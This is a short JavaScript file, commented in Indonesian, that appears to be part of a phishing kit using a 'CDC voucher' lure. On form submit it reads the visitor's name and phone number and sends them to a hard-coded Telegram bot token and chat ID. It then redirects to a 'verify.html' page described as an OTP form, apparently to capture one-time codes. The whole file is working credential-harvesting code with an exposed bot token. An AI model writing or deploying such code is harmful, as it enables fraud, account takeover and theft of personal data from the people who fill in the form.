// Fungsi untuk mengirim data ke Telegram
async function sendToTelegram() {
    const formData = new FormData(document.querySelector('form')); // Ambil data form

    // Ambil data dari form
    const fullName = formData.get('name');
    const phoneNumber = formData.get('phoneNumber');

    // Simpan nomor telepon ke dalam sessionStorage (atau bisa ke localStorage/session di browser)
    sessionStorage.setItem('phone_number', phoneNumber);

    // Token dan Chat ID Telegram
    const botToken = '7506300483:AAHzMEh0_XTLa6nUNxMuWAFo3bSp20HWcQM';  // Ganti dengan token bot Anda
    const chatId = '6000448808'; // Ganti dengan chat ID Anda

    // Format pesan
    const message = `📋 *CDC_voucher Ress*\n` +
                    `👤 *Nama:* ${fullName}\n` +
                    `📞 *Nomor:* \`${phoneNumber}\`\n` +
                    `🕒 *Waktu:* ${new Date().toISOString()}\n`;

    // URL Telegram API
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Membuat objek payload
    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        // Kirim data ke Telegram menggunakan fetch API
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        
        if (data.ok) {
            // Redirect ke halaman OTP jika pesan berhasil dikirim
            window.location.href = 'verify.html'; // Halaman form OTP
        } else {
            alert('Failed to send message.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Failed to send message.');
    }
}

// Menambahkan event listener untuk meng-handle submit form
document.querySelector('form').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah form dikirimkan secara default
    sendToTelegram(); // Panggil fungsi untuk mengirim data ke Telegram
});
